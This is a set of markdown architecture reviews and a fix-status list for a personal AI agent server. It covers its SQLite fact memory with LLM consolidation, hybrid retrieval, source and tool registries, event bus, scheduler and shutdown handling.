# Architecture Review — Fix Status

All 8 prioritized issues from the review have been addressed:

1. **Move LLM calls outside `_db_lock`** — FIXED. Split `consolidate_fact` into `get_consolidation_decision` (reads+LLM outside lock) and `apply_consolidation` (writes under lock). 3-phase pattern in `_consolidate_pending`.
2. **Add timeout to approval queue** — FIXED. `asyncio.wait_for(..., timeout=300)` on both `require_approval` and `ask_choice`. Raises `PermissionDenied` / returns `[]` on timeout.
3. **Move LLM calls outside `_db_lock`** — (same as #1, see above)
4. **Fix shutdown drain** — FIXED. Scheduler tracks `_running_execution` as separate task via `asyncio.shield`. `stop()` awaits it with 30s timeout before closing.
5. **Remove duplicate source references** — FIXED. Removed `self.gmail`/`self.browser` from Runtime. Added `get_gmail()`/`get_browser()` accessors that delegate to `source_mgr.sources.get()`. Simplified `reinit_source`/`remove_source`.
6. **Add error isolation to EventBus** — FIXED. `try/except` per handler in `publish()` with logging. Failures no longer propagate to publisher.
7. **Scheduler takes interfaces, not Runtime** — FIXED. `SchedulerDeps` frozen dataclass with typed fields. Scheduler no longer depends on Runtime. Uses callables for `memory`, `gmail`, `source_details`, `create_session`.
8. **Dashboard queries properties, not private state** — FIXED. Added `active_run_count` property to `RunRegistry`, `is_running` to `Scheduler`, `is_consolidating` to `FactMemory`. Dashboard uses these instead of accessing `_runs`, `_task`, `_consolidation_task`.
9. **Add auth for network exposure** — FIXED. `NTRP_API_KEY` config field + bearer token middleware in `app.py`. Skips auth when key not configured (local-only). `/health` always accessible.
10. **No transactions in `remember()`** — FIXED. Added `auto_commit` flag to `BaseRepository`. `remember()` and consolidation phase 3 use `auto_commit=False` with explicit `commit()`/`rollback()` for atomic operations.
11. **Cancellation drops session** — FIXED. Moved session save and dashboard recording to `finally` block in `event_generator`. All three paths (normal, cancelled, error) now persist session, capture agent tokens/messages, and record metrics.
12. **N+1 queries in linking** — FIXED. Added `create_links_batch` to `FactRepository` using `executemany`. Linking functions now compute all links first, then batch INSERT in one call.
13. **ScoredRow frozen mutation bug** — FIXED. Set `rank` at construction time instead of mutating frozen dataclass.
14. **Index not cleared on source removal** — FIXED. `_on_source_changed` now clears stale index entries via `clear_source()` when a source is no longer active.
15. **FTS inconsistency** — FIXED. `search_facts_fts` now uses per-term matching (same as `SearchStore.fts_search`) instead of phrase match for better recall.
16. **`@lru_cache` on `get_config()`** — FIXED. Replaced with explicit module-level singleton pattern.
17. **Orphaned entity GC** — FIXED. Added `cleanup_orphaned_entities()` to `FactRepository`. Called from `forget()` after deleting facts to remove entities with no remaining refs.
18. **FTS inconsistency** — FIXED (see #15).
19. **Spec pattern ceremony** — FIXED. Replaced `SourceSpec` Protocol + 5 frozen dataclasses in `registry.py` with `SourceEntry` tuple dict. Replaced `ToolSpec` Protocol + 8 frozen dataclasses in `specs.py` with plain factory functions and `TOOL_FACTORIES` list.
20. **Typed source registry** — FIXED. Created proper `Source` base class with `name`, `errors`, `details` defaults. All 5 concrete sources extend `Source`. `SourceManager`, `ToolDeps`, `ToolExecutor` typed as `dict[str, Source]` — zero `dict[str, Any]` in the source path. Added `@runtime_checkable` to all source Protocols.
21. **Pydantic domain models** — FIXED. Converted all 11 frozen dataclasses in the memory system (`Fact`, `Observation`, `Entity`, `EntityRef`, `FactLink`, `FactContext`, etc.) to Pydantic BaseModel. Killed all `_row_to_*` manual mappers — unified on `Model.model_validate()`. Replaced `dataclasses.replace()` with `model_copy(update={})`. Zero dual construction paths.
22. **Pydantic tool schemas** — FIXED. Replaced hand-rolled `make_schema()` + `parameters` property across 12 tool files with Pydantic `Input` models. Each tool defines a `BaseModel` subclass; schema generated via `model_json_schema()`. Removed ~400 lines of manual JSON schema dictionaries.
23. **Queue alias confusion** — FIXED. Queues now live on `RunState` only. Renamed `event_queue` → `approval_queue`. Removed queue fields from `ChatContext`. No more aliasing across 3 files — one Queue, one name, one owner.
24. **Config validation on update** — FIXED. `PATCH /config` validates all fields BEFORE mutation: `chat_model`/`memory_model` checked against `SUPPORTED_MODELS`, `max_depth` range 1-100, `browser_days` range 1-365. Returns 400 before touching any state.
25. **Real health check** — FIXED. `/health` now checks runtime connected, session DB accessible, memory DB accessible (if enabled), scheduler running (if enabled). Returns `healthy`/`degraded`/`unhealthy` with per-check details. HTTP 503 for unhealthy.
26. **Concurrent run limit** — FIXED. `MAX_CONCURRENT_RUNS = 3` in `RunRegistry`. `/chat/stream` returns 429 if limit exceeded.
27. **Stream.py queue-merge simplification** — FIXED. Eliminated busy-polling `forward_event_bus()` bridge (~30 wakeups/sec idle). Tools emit directly into the merged queue. Removed `event_bus` from `ChatContext`. Net: simpler architecture, less CPU waste.

---

# Data Layer Architecture Review

## Scope

This review covers the memory system (`ntrp/memory/`), search index (`ntrp/search/`), storage patterns (`ntrp/database.py`), and embedding pipeline (`ntrp/embedder.py`).

---

## 1. Key Architectural Decisions and Rationale

### A. Fact-centric memory with LLM-driven consolidation

The memory system distinguishes between **facts** (raw atomic observations) and **observations** (synthesized patterns distilled from facts via LLM). This is a deliberate two-tier design inspired by the "Generative Agents" paper (Park et al., 2023). Facts accumulate continuously; a background consolidation loop periodically asks an LLM to either create new observations or update existing ones.

**Why**: Facts are cheap to create and always correct (they're verbatim). Observations are expensive but compress knowledge. Separating them lets the system maintain both raw truth and generalized understanding. The LLM decides whether a new fact updates an existing pattern or creates a new one -- this avoids brittle rule-based merging.

### B. Graph-based linking with three link types

Facts are connected through three link types:
- **Temporal**: exponential decay weight based on `happened_at` time proximity
- **Semantic**: cosine similarity above threshold from vector search
- **Entity**: IDF-weighted co-occurrence through shared entity references

**Why**: This creates a traversable knowledge graph for BFS expansion during retrieval. Different link types capture different relationship semantics. The IDF weighting on entity links is particularly smart -- it ensures that "User" (extremely common entity) creates weak links while rare entities create strong ones, preventing the graph from collapsing into a single dense cluster around "User".

### C. Hybrid retrieval: vector + FTS + RRF + BFS

Retrieval follows a pipeline: (1) hybrid search via vector ANN and FTS/BM25, (2) Reciprocal Rank Fusion to merge rankings, (3) BFS expansion through the fact graph, (4) scoring with decay and recency modifiers.

**Why**: No single retrieval signal dominates all queries. Vector catches semantic similarity, FTS catches exact terms. RRF is a well-known, parameter-light fusion method. BFS expansion exploits the graph structure to surface contextually related facts that neither search modality would find directly.

### D. Entity resolution with multi-signal scoring

Entities are resolved using name similarity (SequenceMatcher + prefix matching), co-occurrence in the same source, and temporal proximity. The scoring function has hand-tuned thresholds and weights with an auto-merge threshold of 0.85.

**Why**: Entity resolution is one of the hardest NLP problems. This pragmatic multi-signal approach avoids relying solely on string matching (too brittle) or LLM calls (too slow per-entity). The co-occurrence signal is especially valuable -- if "Bob" appears in the same document as a known "Bob Smith", they're likely the same entity.

### E. SQLite + sqlite-vec as the single data store

Everything -- relational data, FTS5, vector indices -- lives in SQLite via `aiosqlite` and `sqlite-vec`. There's no external database, no Redis, no Postgres.

**Why**: Single-file deployment. The entire knowledge base is one `.db` file. This dramatically simplifies ops, backups, and portability for a personal system. WAL mode + busy_timeout handle the single-writer concurrency model well enough for one user.

### F. Two separate database systems: GraphDatabase vs SearchStore

The memory system uses `GraphDatabase` (facts, observations, entities, links) and the search system uses `SearchStore` (indexed items from external sources like notes, emails). They are completely separate SQLite databases with separate connections.

**Why**: Separation of concerns. Memory is about what the agent knows (extracted knowledge). Search is about what the user has (raw content from sources like Obsidian, browser history). They have different schemas, different update patterns, and different lifecycle. Memory grows through agent interaction; search grows through source syncing.

### G. BaseRepository pattern with connection injection

Repositories receive an `aiosqlite.Connection` and operate as stateless query builders. `FactRepository` and `ObservationRepository` share the same connection from `GraphDatabase`. They're instantiated on-demand, not held as singletons.

**Why**: Keeps the transaction boundary under the caller's control. The caller (FactMemory) holds the `_db_lock` and creates repositories within the critical section. Repositories don't own connections, so they can't accidentally create independent transactions.

---

## 2. Trade-offs

| Decision | Gained | Lost |
|---|---|---|
| SQLite single-file | Zero-ops, portable, atomic backups | No concurrent writers, no distributed reads, no replication |
| LLM consolidation | High-quality pattern synthesis, handles contradictions | LLM latency + cost per fact, consolidation can fail/hallucinate |
| Graph-based BFS | Discovers related context beyond direct search hits | O(edges) per query, graph can grow quadratically with facts |
| Sync consolidation under `_db_lock` | Serial writes, no corruption | Consolidation batch blocks all writes (remember/forget) |
| Embedding at write time | Fast reads, no lazy-compute surprises | Write amplification: every `remember()` call hits the embedding API |
| Frozen dataclasses | Immutability, safe to pass around | Requires `dataclasses.replace()` for modifications, slight verbosity |
| `source_fact_ids` as JSON blob in observations | Simple schema, no junction table | Can't query "which observations reference fact #42" without JSON parsing |
| No migration system | Simple, no migration tooling needed | Schema changes require manual migration or DB recreation |

---

## 3. Strengths

### Clean separation of concerns
Each module owns its domain completely. `extraction.py` only extracts. `consolidation.py` only consolidates. `linking.py` only creates links. `retrieval.py` only retrieves. The `FactMemory` facade composes them without any module reaching into another's internals.

### Well-designed scoring math
The decay formula (`decay_rate ^ (hours / strength)` where `strength = log(access_count + 1) + 1`) is elegant. It means frequently accessed facts decay slower, but the logarithmic strength curve prevents runaway reinforcement. The entity IDF weighting (`1 / log2(freq + 1)`) similarly prevents common entities from dominating.

### Robust embedding pipeline
`Embedder` normalizes vectors after generation and truncates input text. The `deserialize_embedding` function re-normalizes on read (`arr / norm`), protecting against data corruption or un-normalized vectors in storage. The `.copy()` on `np.frombuffer` prevents mutation of the underlying buffer.

### Explicit SQL
All SQL is declared as module-level constants, not generated dynamically. This makes queries auditable, optimizable, and greppable. The parameterized queries prevent SQL injection.

### Pragmatic error handling
Extraction failure returns `ExtractionResult()` (empty, not exception). Consolidation failure marks the fact as skipped. Vector search failure falls back to FTS-only. The system degrades gracefully rather than failing hard.

### Good index coverage
Schema has indexes on `facts(created_at DESC)`, `facts(fact_type)`, `facts(consolidated_at)`, `entity_refs(fact_id, name, canonical_id)`, `fact_links(source_fact_id, target_fact_id, link_type)`. FTS triggers maintain content-synced FTS5 tables for both facts and observations.

### Content-hash deduplication in SearchStore
The `exists_with_hash` and `get_indexed_hashes` pattern in the search index avoids re-embedding unchanged content. This is a significant cost optimization given embedding API costs.

---

## 4. Concerns

### A. `_db_lock` bottleneck (Medium severity)

The `asyncio.Lock` in `FactMemory` serializes all writes. The `_consolidate_pending` method acquires the lock for the entire batch (up to 10 facts), each requiring an LLM call. During that time, `remember()`, `forget()`, and `clear()` all block.

The LLM calls inside `_consolidate_pending` happen *while the lock is held* (`consolidate_fact` calls `_llm_consolidation_decision` which calls `acompletion`). A slow LLM response (2-5 seconds) multiplied by 10 facts means 20-50 seconds of write blocking. The `recall()` method also acquires the lock for reinforcement.

### B. N+1 query patterns (Medium severity)

`create_links_for_fact` creates links one at a time via `repo.create_link()`, each with its own `commit()`. For a fact with 5 entity refs, if each entity appears in 50 facts, that's 250 individual INSERT+COMMIT operations. Similarly, `_process_extraction` calls `_add_entity_ref` individually.

`_format_observations` in consolidation fetches source facts one at a time (`fact_repo.get(fid)`).

### C. Unbounded graph growth (Medium severity)

Entity links can be O(n^2) in the worst case. If entity "User" has 1000 facts, each new User-tagged fact creates links to all 1000 existing ones. The IDF weight will be low (~0.1), but `_ENTITY_LINK_MIN_WEIGHT` is 0.01, so the links still get created.

`BFS_MAX_FACTS = 50` caps retrieval, but the link table itself grows without bounds. There's no pruning or TTL on links.

### D. `recall()` reads outside the lock, reinforces inside (Low severity)

In `recall()`, the hybrid search and graph expansion happen without the lock, but reinforcement acquires it. This is mostly fine since reads are safe with WAL mode, but there's a time-of-check-time-of-use gap: the facts retrieved could be deleted between search and reinforcement. The reinforcement would silently update 0 rows, which is harmless but indicates a conceptual inconsistency.

### E. Observation `source_fact_ids` as JSON blob (Low severity)

`source_fact_ids` is stored as a JSON array in a TEXT column. This means:
- No foreign key enforcement (a deleted fact stays referenced)
- No index-assisted lookup of "observations containing fact X"
- `get_fact_ids()` requires JSON parsing per row

This works for small observation counts but could become a maintenance burden if observations accumulate and facts are deleted.

### F. No transactions spanning multiple operations (Low severity)

Each repository method calls `conn.commit()` individually. `FactRepository.create()` commits the fact, then extraction and linking happen with separate commits. If the process crashes between `create()` and `create_links_for_fact()`, you get a fact without links. The outer `remember()` method doesn't use an explicit transaction.

### G. FTS query escaping (Low severity)

In `FactRepository.search_facts_fts()`, the query is wrapped in double quotes: `'"' + query.replace('"', '""') + '"'`. This treats the entire query as a phrase match, which may not be what users expect -- they likely want OR semantics for multiple words. The `SearchStore.fts_search()` splits on whitespace and quotes each term individually, which is the correct approach. The memory FTS search is inconsistent with the search index FTS behavior.

### H. `ScoredRow` is frozen but has mutable `rank` assignment (Low severity)

`ScoredRow` is `@dataclass(frozen=True)` with `rank: int = 0`, but in `HybridRetriever._vector_search()` and `_fts_search()`, the code does `row.rank = i + 1`. This should raise `FrozenInstanceError` at runtime. This appears to be a bug that either isn't hit (maybe `frozen` got added later) or is masked by the attribute being used differently.

---

## 5. Missing Pieces

### A. No schema migration system
There's no Alembic, no version table, no migration scripts. Adding a column to `facts` or `observations` requires manual intervention. For a personal project this is acceptable, but any schema evolution will be painful.

### B. No fact deduplication
Two calls to `remember("User works at Anthropic")` create two identical facts. There's no content hash or near-duplicate detection at write time. Over time, this leads to redundant facts that pollute search results and waste embedding compute.

### C. No garbage collection for orphaned entities
When facts are deleted via `forget()`, entity_refs are cleaned up, but entities themselves persist even if no facts reference them anymore. The `entities` table grows monotonically. There's no periodic cleanup of entities with zero remaining references.

### D. No observation pruning
Observations are never deleted. If an observation becomes stale (all source facts deleted), it persists with broken `source_fact_ids` references. There's no revalidation or cleanup process.

### E. No bulk embedding
`FactMemory.remember()` embeds one text at a time via `embed_one()`. When many facts are created in sequence (e.g., importing from a source), each fact triggers a separate embedding API call. The `SearchIndex.sync()` method does batch embedding, but the memory system doesn't.

### F. No vector index maintenance
sqlite-vec's vec0 tables don't require explicit rebuilding, but there's no monitoring of index quality as the data grows. No metrics on recall quality, retrieval latency, or index size.

### G. No search source filtering in memory
The search index supports `sources` filtering (`search(query, sources=["notes"])`) but the memory system has no equivalent. All facts are searched together regardless of `source_type`. For a user with thousands of facts from different sources, this could reduce precision.

### H. No observation-to-entity connection
Observations are synthesized from facts, but they don't carry entity references. An observation like "Alice is a Python-focused developer" mentions "Alice" but there's no `observation_entity_refs` table. This means entity-based queries can't surface observations directly, only indirectly through source facts.

---

## 6. Data Flow Summary

```
User input
  |
  v
FactMemory.remember()
  |-- embed text (Embedder.embed_one)
  |-- create fact + vec index (FactRepository.create)
  |-- extract entities (Extractor.extract via LLM)
  |-- resolve entities (name sim + vector sim + co-occurrence + temporal)
  |-- create entity refs
  |-- create links (temporal + semantic + entity)
  |-- publish FactCreated event
  v
Background consolidation loop (every 30s)
  |-- list unconsolidated facts
  |-- for each fact:
  |   |-- vector search for similar observations
  |   |-- LLM decision: create/update/skip observation
  |   |-- execute action (create/update observation + vec index)
  |   |-- mark fact as consolidated
  v
FactMemory.recall()
  |-- embed query
  |-- hybrid search (vector ANN + FTS/BM25)
  |-- RRF merge
  |-- BFS graph expansion through links
  |-- score with decay + recency
  |-- vector search observations
  |-- reinforce accessed facts + observations
  |-- return FactContext(facts, observations)
  v
format_memory_context() -> injected into agent system prompt
```

---

## 7. Overall Assessment

This is a well-architected personal knowledge system. The fact-to-observation consolidation pattern is genuinely novel and well-executed. The hybrid retrieval pipeline with BFS expansion is sophisticated but not over-engineered -- each component earns its complexity. The choice of SQLite with sqlite-vec is pragmatic and appropriate for the single-user use case.

The main structural risk is the `_db_lock` contention during consolidation, which can block user-facing writes for significant periods when the LLM is slow. The N+1 query patterns in linking and entity processing will become noticeable as the fact count grows beyond a few thousand.

The separation between the memory system (agent knowledge) and search index (user content) is clean and well-motivated. Both use the same embedding and hybrid retrieval primitives but maintain independent storage and lifecycles.
# Integration Layer Architecture Review

**Reviewer:** integration-architect
**Scope:** Source registry, source manager, tool registry, tool executor, source base classes, individual sources, and end-to-end wiring

---

## 1. End-to-End Flow Summary

The integration layer connects data sources to agent-callable tools through a three-layer pipeline:

```
Config → SourceSpec.enabled/create → SourceManager._sources dict
                                            ↓
                                     ToolDeps(sources=...)
                                            ↓
                                     ToolSpec.create(deps) → Tool instances
                                            ↓
                                     ToolRegistry._tools dict
                                            ↓
                                     ToolExecutor.execute(tool_name, ...)
                                            ↓
                                     Agent LLM loop
```

On config change, the `EventBus` publishes `SourceChanged`, which triggers `Runtime._on_source_changed` → `rebuild_executor()`, destroying and re-creating the entire `ToolExecutor` and all `Tool` instances.

---

## 2. Key Architectural Decisions

### 2.1 Protocol-Based Source Contracts (base.py)

Sources are defined as `Protocol` classes: `NotesSource`, `EmailSource`, `CalendarSource`, `BrowserSource`, `WebSearchSource`. Concrete implementations (ObsidianSource, MultiGmailSource, etc.) satisfy these structurally -- no explicit inheritance needed in most cases (though `MultiGmailSource(EmailSource)` does inherit explicitly).

**Why:** Decouples tool code from source implementations. Tools depend on the protocol, not concrete classes. Adding a new notes backend (e.g., Notion) requires zero changes to note tools -- just implement the `NotesSource` protocol.

**Trade-off:** Structural typing means protocol violations are only caught at runtime. No IDE-time or mypy enforcement unless you explicitly inherit (which some sources do, some don't -- inconsistently).

### 2.2 Spec Pattern (registry.py, specs.py)

Both sources and tools use a "spec" pattern: frozen dataclass with `name`, `enabled(config)`, and `create(deps)` methods. Specs are instantiated once at module level into module-level collections (`SOURCES` dict, `TOOLS` list).

**Why:** Separates "can this thing be created?" from "create it." Avoids import-time side effects. The frozen dataclass ensures specs are immutable singletons.

**Trade-off:** Every new source or tool requires adding a new dataclass + adding it to the module-level collection. This is manual but explicit.

### 2.3 Type-Based Source Discovery in Tools (`_find_source`)

`specs.py:52-56` uses `_find_source(sources, source_type)` which iterates the sources dict and returns the first instance matching a given type. Tool specs use this to find their data source:

```python
source = _find_source(deps.sources, NotesSource)
```

**Why:** Sources are registered by name ("notes", "email") but tools need them by interface type. This bridges the gap without requiring sources to self-declare their protocol.

**Trade-off:** O(n) linear scan on every tool group creation. If two sources implement the same protocol, only the first is found. Neither issue matters at current scale (5 sources) but is architecturally imprecise.

### 2.4 Full Executor Rebuild on Source Change

When any source changes (reinit, remove), `SourceChanged` is published via `EventBus`, triggering `rebuild_executor()` which creates a brand-new `ToolExecutor` and `ToolRegistry`, re-instantiating every tool.

**Why:** Simple, correct, no stale state. After a source change, all tools get fresh references.

**Trade-off:** All tools are destroyed and recreated, even if the change only affected one source. This is O(all_tools) work for O(1) source change. At current scale this is negligible, but it's a blunt instrument.

### 2.5 ToolDeps as a Flat Bag

`ToolDeps` is a frozen dataclass that bundles everything tools might need: sources dict, memory, search_index, schedule_store, default_email, working_dir. Every `ToolSpec.create()` receives the full bag.

**Why:** Avoids passing many individual parameters. Single point of truth for tool dependencies.

**Trade-off:** It's a grab-bag. Every tool spec gets access to everything, even things it doesn't use. `CoreToolsSpec` receives memory and schedule_store even though it only uses `working_dir`. The frozen dataclass mitigates mutation risk.

### 2.6 EventBus for Decoupled Lifecycle

`EventBus` is a simple publish/subscribe system with typed events. Used for: `SourceChanged` (triggers executor rebuild + re-indexing), `FactCreated/Updated/Deleted` (triggers index updates), `MemoryCleared`.

**Why:** Decouples the producer (SourceManager, FactMemory) from consumers (Runtime, Indexer, Dashboard). Runtime doesn't need to know who publishes SourceChanged events.

**Trade-off:** Sequential handler execution (`await handler(event)` in a loop). A slow handler blocks all subsequent handlers. No error isolation -- an exception in one handler could prevent others from running.

---

## 3. Strengths

### 3.1 Clean Separation of Concerns

The layering is genuinely clean:
- `registry.py` knows about Config and source creation, nothing about tools
- `specs.py` knows about tools and source protocols, nothing about Config
- `executor.py` knows about tool registration, nothing about sources or specs
- `runtime.py` orchestrates all of them together

Each file is small, focused, and testable in isolation.

### 3.2 Protocol-Based Contracts Are Well-Designed

The source protocols in `base.py` are practical and minimal. `NotesSource` has exactly the operations notes tools need: read, write, delete, exists, move, search, scan. No bloat, no speculative interfaces. The `WebSearchSource` protocol cleanly separates search from content fetching.

### 3.3 Multi-Account Support is Elegant

`MultiGmailSource` and `MultiCalendarSource` wrap multiple single-account sources and present a unified interface. The wrapping is transparent -- tools don't know or care about multi-account. The per-account limit splitting (`max(limit // len(self.sources), 5)`) is a nice practical touch.

### 3.4 Error Resilience During Initialization

`SourceManager._init_sources` catches exceptions per-source and continues. `MultiGmailSource.__init__` catches per-token-path exceptions. A broken Gmail token doesn't prevent Calendar from loading. Errors are recorded in `_errors` dict and surfaced to the API.

### 3.5 Schema Pre-Computation

`ToolRegistry.register()` pre-computes and caches `tool.to_dict()`. Since schemas don't change after tool creation, this avoids redundant computation on every LLM call. Small optimization, but shows attention to the hot path.

### 3.6 The `mutates` Flag

Tools declare `mutates = True/False`, and `ToolRegistry.get_schemas(mutates=...)` can filter by this. This enables read-only tool subsets (used by the scheduler to run tasks with only non-mutating tools). Clean way to create capability tiers without separate tool sets.

---

## 4. Concerns

### 4.1 Sources Dict Is `dict[str, Any]` -- Total Type Erasure

`SourceManager._sources` is `dict[str, Any]`. `ToolDeps.sources` is `dict[str, Any]`. This means:
- No type checking at all. A source could be anything -- a string, an integer, None.
- `_find_source` does `isinstance` checks at runtime to recover type information that was thrown away.
- `source.errors` and `source.details` are duck-typed -- if a source doesn't have these attributes, it crashes at runtime.

The `Source` ABC (base.py:15-31) exists but isn't consistently used. `ObsidianSource` uses `NotesSource` (a Protocol), not `Source` (the ABC). `WebSource` uses `WebSearchSource` (a Protocol). Neither inherits from `Source`, so the `errors` property with its `hasattr` trick is only available to the Multi* wrappers.

**Risk:** Adding a new source that forgets `errors` or `details` will crash `SourceManager._init_sources` at line 71 (`source.errors`) or `get_details` at line 33 (`source.details`).

### 4.2 Inconsistent Protocol vs ABC Inheritance

Some source implementations inherit from their protocol (`MultiGmailSource(EmailSource)`, `MultiCalendarSource(CalendarSource)`), some don't (`ObsidianSource` declares `NotesSource` as a type hint only, `BrowserHistorySource(BrowserSource)` does inherit). `WebSource(WebSearchSource)` inherits.

This inconsistency means mypy/pyright enforcement is hit-or-miss. The `Source` ABC's `errors` property uses a `hasattr` guard which is a code smell -- it suggests the base class can't guarantee its own invariants.

### 4.3 Runtime Has Dual Source References

`Runtime` has `self.source_mgr` (the source manager) but ALSO `self.gmail` and `self.browser` as direct references:

```python
self.gmail: MultiGmailSource | None = self.source_mgr.sources.get("email")
self.browser: BrowserHistorySource | None = self.source_mgr.sources.get("browser")
```

When `reinit_source` or `remove_source` is called, Runtime manually updates these:
```python
async def reinit_source(self, name: str) -> None:
    source = await self.source_mgr.reinit(name, self.config)
    if name == "email":
        self.gmail = source
    elif name == "browser":
        self.browser = source
```

**Risk:** If a new source needs a direct reference, someone has to remember to update `reinit_source` and `remove_source`. This is a maintenance trap. The `session.py` router also accesses `runtime.gmail` directly for listing accounts.

### 4.4 SourceSpec.create Returns `Any | None` -- No Contract

`SourceSpec.create` returns `Any | None`. The protocol says nothing about what properties the returned object must have. The caller (`SourceManager`) immediately accesses `source.errors` and `source.details`, but this isn't part of any typed contract.

### 4.5 Memory Is a Special Case Everywhere

Memory (FactMemory) is not a source in the `SOURCES` registry. It's handled separately:
- `Runtime.reinit_memory()` is a separate method from `reinit_source()`
- `get_available_sources()` manually appends "memory" to the sources list
- `MemoryToolsSpec.create()` checks `deps.memory` instead of using `_find_source`
- `_on_source_changed` fires `rebuild_executor` for memory changes via `SourceChanged(source_name="memory")`

Memory uses the same event (`SourceChanged`) but isn't in the source registry. This creates cognitive overhead -- "is memory a source?" The answer is "sort of, but not really."

### 4.6 No Source/Tool Lifecycle Management

Sources are created synchronously in `SourceManager._init_sources`. None have `close()`, `connect()`, or cleanup methods. `GmailSource` and `GoogleCalendar` lazily create API services (`_get_service`) but never clean them up. When `rebuild_executor` destroys old tools, references to old sources may linger.

`BrowserHistorySource` copies the browser's SQLite DB to a temp file on every operation (`_copy_db`). While it cleans up in the context manager, the design means every search/read copies potentially hundreds of MB.

### 4.7 EventBus Handlers Run Sequentially

`EventBus.publish` awaits each handler sequentially:
```python
async def publish[T](self, event: T) -> None:
    for handler in self._handlers.get(type(event), []):
        await handler(event)
```

For `SourceChanged`, this means `rebuild_executor` runs first, then `start_indexing` runs second. If `rebuild_executor` is slow (unlikely now but possible), indexing is delayed. No error isolation either -- if one handler raises, subsequent handlers never run.

### 4.8 Config Mutation

`Config` is a Pydantic `BaseSettings` that gets mutated in place by `update_config`:
```python
runtime.config.chat_model = req.chat_model
runtime.config.vault_path = vault_path
```

Despite using `_config_lock`, this means the `Config` object is not immutable. Any code holding a reference to `runtime.config` sees mutations. This is fine in a single-process server but violates the principle of least surprise -- BaseSettings objects are typically treated as immutable.

---

## 5. Missing Pieces

### 5.1 No Source Health Checks

Sources are created once and assumed to work forever. If a Gmail token expires mid-session, operations fail with raw API errors. There's no periodic health check, no reconnection logic, no way to detect stale credentials proactively.

### 5.2 No Tool-Level Error Reporting

When a source fails during tool execution, errors are returned as strings in `ToolResult`. There's no structured error type, no error categorization (auth failure vs network error vs data error), no retry semantics.

### 5.3 No Source Dependency Declaration

Tool specs discover sources at creation time via `_find_source`. There's no explicit declaration of "NotesToolsSpec requires NotesSource." If the source isn't available, tools silently don't register. This is fine for optional features but means there's no way to ask "what would it take to enable these tools?"

### 5.4 No Async Source Creation

All sources are created synchronously (`spec.create(config)`). For sources that need network calls (Gmail token refresh, Calendar credential validation), this blocks the event loop during initialization. The `MultiCalendarSource.__init__` calls `src._get_credentials()` which may trigger an HTTP request.

### 5.5 No Index Invalidation on Source Change

When a source is removed (`remove_source`), the search index still contains that source's documents. There's no `await self.indexer.index.clear_source(name)` call in `remove_source`. The `_on_source_changed` handler calls `start_indexing` only for "notes" and "memory" sources.

### 5.6 No Plugin/Extension System

Adding a new source requires modifying three files: the source implementation, `registry.py` (add a spec), and potentially `specs.py` (add a tool spec). There's no plugin discovery, no dynamic loading, no way to add sources without modifying core code. This is fine for a personal project but limits extensibility.

---

## 6. Architectural Assessment

The integration layer is **solid and pragmatic**. It makes the right tradeoffs for a personal productivity tool:

- **Simplicity over flexibility:** The spec pattern is verbose but dead simple. No metaclasses, no decorators, no auto-discovery magic.
- **Correctness over performance:** Full executor rebuild on any change is wasteful but guarantees no stale state.
- **Explicitness over DRY:** Each spec is its own dataclass. Repetitive but searchable, debuggable, and modifiable independently.

The main risks are around type safety (`Any` everywhere) and the memory special-casing. These aren't bugs today but make the system harder to reason about as it grows.

The event bus is the most architecturally elegant piece -- it cleanly decouples lifecycle events from their handlers and allows the runtime to react to changes without tight coupling. The TODO comment about using a queue suggests the author is aware of the sequential execution limitation.

**Overall: 7.5/10** -- Clean, pragmatic, well-structured. The type erasure and inconsistent protocol usage are the main architectural debts.
# Runtime & Lifecycle Architecture Review

**Reviewer:** runtime-architect
**Scope:** Runtime singleton, EventBus, Scheduler, Agent loop, Context compression, Dashboard collector, background tasks, shutdown lifecycle.

> **Post-review corrections (after staff-architect challenge):**
> - Section 1.1: Reframed Runtime as Application class, not god object. Grade upgraded from C+ to B+.
> - Section 3.4: Shutdown race is safe for DB use-after-close (await propagates through finally). Real problem is silent agent kill and orphaned sub-agent tasks.
> - Section 3.7: `_config_lock` is NOT dead code — it is used by `session.py:update_config` (line 128). Locking is consistent today but implicitly so.
> - Section 5 addendum: Test suite covers only memory layer. Agent, Scheduler, Runtime, EventBus, compression, streaming have zero tests.
>
> **Further corrections (after zen-nerd and devil's-advocate challenges):**
> - Section 1.1: Downgraded Runtime back to B-. It IS an Application class at its core, but bidirectional coupling (Scheduler and DashboardCollector reaching back into Runtime internals) makes it a degraded one.
> - Section 1.2: EventBus earns its keep for FactMemory->indexer decoupling. But 5 of 6 handlers are Runtime calling itself through the bus. SourceChanged path is pure self-indirection.
> - Section 3.3: Scheduler is the worst-coupled module in the codebase. Fix: agent factory function instead of Runtime reference.
> - Section 3.4: Orphaned sub-tasks from `ToolRunner._execute_concurrent` (line 162) are the worst shutdown problem — fire-and-forget `asyncio.create_task` with no tracking.
> - Section 3.7: `_config_lock` is used but accessed as private attribute from outside the class — encapsulation violation. `@lru_cache` on `get_config()` is semantically dishonest — suggests immutability but delivers shared mutable state.
>
> **Recommended targeted fixes (not a rewrite):**
> 1. Scheduler takes a factory function, not Runtime
> 2. DashboardCollector queries interfaces (`is_running` properties), not private state
> 3. Remove `self.gmail`/`self.browser` from Runtime — access via `source_mgr.sources.get()`
> 4. Error isolation in `_on_source_changed` (try/except around rebuild_executor)
> 5. Drop `@lru_cache` from `get_config()` — use explicit module-level singleton
> 6. Track spawned tasks in ToolRunner for clean cancellation
> 7. Make `_config_lock` public or wrap in context manager

---

## 1. Key Architectural Decisions and Why They Were Made

### 1.1 Runtime as Application Root (God Object Pattern)

The `Runtime` class (`ntrp/server/runtime.py`) owns everything: config, event bus, source manager, indexer, session store, memory subsystem, scheduler, dashboard, tool executor, and run registry. It is instantiated once via a module-level singleton pattern (`_runtime` + `_runtime_lock`).

**Why:** This is a personal tool, not a multi-tenant service. A single god object that owns the full application lifecycle is the simplest possible coordination point. There is no need for a DI container, service registry, or microkernel when one user runs one server. The Runtime *is* the application.

**Trade-off:** Gained extreme simplicity at the cost of testability and modular replacement. Every subsystem reaches back into Runtime for cross-cutting concerns (e.g., Scheduler takes `Runtime` directly, DashboardCollector accesses `runtime.memory._consolidation_task`, etc.). This means testing any subsystem in isolation requires constructing the entire Runtime.

### 1.2 Synchronous EventBus with Await-All Semantics

The `EventBus` (`ntrp/bus.py`) is 19 lines. Handlers are `async` callables. `publish()` awaits each handler sequentially.

**Why:** Minimal complexity. Events are rare (fact CRUD, source changes) and handlers are fast (index upsert, dashboard append). No need for queue-based decoupling, backpressure, or ordered delivery guarantees.

**Trade-off:** If any handler blocks or raises, all subsequent handlers for that event are delayed or skipped. This is fine today because the handler set is small and controlled, but it would become a problem if third-party handlers or slow operations were added.

